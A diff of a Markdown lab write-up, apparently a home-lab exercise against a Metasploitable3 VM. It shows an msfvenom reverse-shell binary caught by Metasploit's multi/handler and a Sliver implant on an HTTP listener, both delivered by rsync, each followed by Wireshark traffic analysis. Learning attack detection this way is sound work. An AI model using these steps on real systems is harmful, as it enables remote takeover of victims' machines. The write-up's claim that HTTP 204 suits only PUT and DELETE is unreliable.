@@ -1,6 +1,6 @@
 # A) Venom
 **Objective**
-- Create malware using **Msfvenom** that spins up a **reverse shell**
+- Create malware using **Msfvenom** that calls "home" and establishes a **reverse shell**
 - Accept the connection using Metasploits `multi/handler`
 
 
@@ -17,7 +17,7 @@ More on ms3 [here](<https://github.com/rapid7/metasploitable3>) and how I [set i
 
 
 ## Reverse 🐚
-Fire up Kali and sraight to man pages we go:
+Fire up Kali and straight to man pages we go:
 ```bash
 $ man msfvenom
 ```
@@ -37,11 +37,13 @@ $ chmod +x legitBin
 Flags explained:
 - `-p`: Payload to use: `linux/x86/shell_reverse_tcp`
 - `-f`: Output format: `elf`
-  - Executable & Linkable Format is a binary format which can be executed on the system 
-- `-o`: Where to store output
+  - `Executable & Linkable Format` is a binary format which can be executed on the system 
+- `-o`: Where to store output: `legitBin` A.K.A `Totally Legit Binary you Should Execute!`
 
 > [!TIP]
-> Use tab completion to your advantage. For example, after specifying the platform `linux/`, press tab a few times to get all the available options!
+> Use tab completion to your advantage. For example, after specifying the platform and architecture `linux/x86/`, press tab a few times to get all the available options for that specific `OS/Arch`!
+>
+> Note: I'm using using the `Z Shell` A.K.A `ZSH` here!
 
 
 In `msfconsole` we use the `multi/handler` module to set up a listener:
@@ -51,10 +53,15 @@ msf > use exploit/multi/handler
     > options
     > set LHOST 192.168.130.233
     > set LPORT 4040
-    > set payload linux/x86/shell_reverse_tcp    # <-- Match the payload
+    > set payload linux/x86/shell_reverse_tcp
     > run
 [*] Started reverse TCP handler on 192.168.130.233:4040 
 ```
+**Explained**
+- `LHOST`: Same IP as in the payload (attackers IP)
+- `LPORT`: Port to listen to, same as in the payload
+- `payload`: Match it with the one we created the payload with
+
 Now that the listener is running we can execute the payload on the victims machine to get a reverse shell.
 
 
@@ -67,7 +74,7 @@ Host is up
 ```
 
 
-**Drop the payload:**
+**Drop the bomb:**
 ```bash
 $ rsync -av legitBin vagrant@192.168.130.202:/home/vagrant/
 ```
@@ -77,7 +84,7 @@ The victim clicked a link which downloaded & executed the binary:
 
 <img width="876" height="169" alt="2026-04-30-16:27:06" src="https://github.com/user-attachments/assets/a0d66341-2b3f-481e-ac20-f9e65f27a20c" />
 
-The attacker now has a reverse shell:
+The listener catches the connection and the attacker effectively now has a reverse shell:
 <img width="1793" height="769" alt="2026-04-30-16:26:39" src="https://github.com/user-attachments/assets/e94a33e8-4162-482c-bbe6-40db9c8a2847" />
 
 
@@ -97,15 +104,12 @@ The attacker now has a reverse shell:
  
 
 ## Eavesdropping
-I started packet capturing on the attackers interface `eth1` using Wireshark.
+I started capturing packets on the attack machines's interface `eth1` using Wireshark. We can inspect the data being exchanged more closely by `right clicking` one of the packets, then click `Follow` and lastly choose: `TCP Stream`.
 
-We can inspect the data being exchanged more closely by right clicking on one of the packets, then --> `Follow` and lastly --> `TCP Stream`.
-
-`Red` is the attacker and `blue` is the response from the victim:
+`Red` is the attacker and `blue` is the response from the victim, talk about read team / blue team lol:
 
 <img width="1394" height="846" alt="2026-04-30-16:56:30" src="https://github.com/user-attachments/assets/42c6299b-4d5b-49e3-9de1-25c858181a74" />
 
-Talk about red team / blue team...
 
 This makes it obvious that somebody is connected to the machine and executing shell commands. One could **obscure** it by encrypting the traffic for example!
 
@@ -140,13 +144,12 @@ Type `sliver-server` for the interactive console:
 
 > [!TIP]
 > Type `help` for a listing of all available commands !
->
-> Some of the commands in Sliver are platform dependent, allthough you shouldn't even see the ones you cannot use if you downloaded the program from the correct channels.
+
 
 ## Modes
-Sliver `implants` operate in `beacon` or `session` mode. Beacon mode basically means that the implant on the client will periodically retreive tasks from the server, execute, and return with the results, this is an asynchronous mode of communication.
+Sliver `implants` operate in `beacon` or `session` mode. **Beacon mode** basically means that the implant on the client will periodically retreive tasks from the server, execute them, and return with the results, this is an asynchronous mode of communication.
 
-In session mode the implant creates a real-time session either by a persistent connectin or long polling. Long polling basically means the client will check in with the server and only return after there's something to return with, compared to short polling where the client periodically sends probes to the target.
+In **session mode** the implant creates a real-time session either by a **persistent connection** or **long polling**. Long polling basically means the client will check in with the server and only return after there's something to return with, compared to short polling where the client periodically sends probes to the target.
 
 **Q:** You talked about implants, what are they?
 
@@ -156,7 +159,7 @@ In order to establish a connection, we first need to **generate the implant**. W
 ```console
 sliver > generate --help
 ```
-This gives us a pretty comprehensive look on all the options.
+This gives us a pretty comprehensive list of all the options.
 
 Having perused the help page we come up with the following:
 ```console
@@ -184,17 +187,18 @@ sliver > http
 [*] Starting HTTP :80 listener ...
 [*] Successfully started job #2
 ```
-Active session?
+
+### Active session?
 
 <img width="533" height="129" alt="2026-04-30-19:39:41" src="https://github.com/user-attachments/assets/e1ce07f8-5fbf-40c9-a21f-78c1b8332220" />
 
-Not yet :/. Let's change that! If you paid attention you know it saved the **payload** to a directory I created earlier for sliver. 
+Not yet :/ Let's change that! If you paid attention you know it saved the **payload** to a directory I created earlier for sliver. 
 
 We go to the directory and send the payload away:
 ```bash
 $ rsync -av PAINFUL_WHORL vagrant@192.168.130.202:/home/vagrant
 ```
-On the victim: (play along again that we did some magnificent phishing campaign and got the victim to download the malware! 😆)
+On the victim: (play along that we did some magnificent phishing campaign again and got the victim to download the malware! 😆)
 <img width="881" height="120" alt="2026-04-30-19:44:01" src="https://github.com/user-attachments/assets/4b4df092-8eb5-4958-89ab-a1fa70b40692" />
 
 If we type `sessions` again in the console we can see that the connection is activated:
@@ -208,7 +212,7 @@ To `use` the session we:
 
 While connected you can always type `help` to get a list of all available commands in the session.
 
-For example, list all interfaces on the host:
+Example of a command we can use: list information about host interfaces:
 <img width="1714" height="886" alt="2026-04-30-19:49:03" src="https://github.com/user-attachments/assets/9947b35c-d717-4cab-8c0f-185e427e5089" />
 
 And there you have it, a simple `HTTP` connection. Next we'll dissect it.
@@ -233,13 +237,13 @@ And there you have it, a simple `HTTP` connection. Next we'll dissect it.
 ## Eavesdropping
 Fire up wireshark and start listening.
 
-The first suspect thing we notice is that the connection uses `HTTP` which is inherently insecure, plus it uses an old version of said protocol `HTTP/1.1`.
+The first suspicious thing we notice is the connection using `HTTP`, which is inherently insecure, plus it uses an old version of said protocol `HTTP/1.1`.
 
 Let's take a look at an example:
 
 <img width="1868" height="392" alt="2026-04-30-19:54:24" src="https://github.com/user-attachments/assets/d8ec6b86-a685-42ef-91af-23e6676a3594" />
 
-The connection is insecure and the `URI` is looking a bit suspicious as well.
+The connection is insecure and the `URI` is looking a bit suspect as well.
 
 If we `follow tcp stream` again it looks even more questionable:
 
@@ -249,7 +253,7 @@ There's a bunch of `GET` requests and the server keeps responding with `204 No C
 
 **Q:** What makes it suspect?
 
-**A:** The fact that the 204 response is meant for `PUT` and `DELETE` requests, **NOT** `GET`. At least that's the understanding I got from the [Mozilla developer docs](<https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Status/204>).
+**A:** The fact that the 204 response is meant for `PUT` and `DELETE` requests, **NOT** `GET`. At least that's the understanding I got from the [Mozilla developer docs](<https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Status/204>)
 
 
 
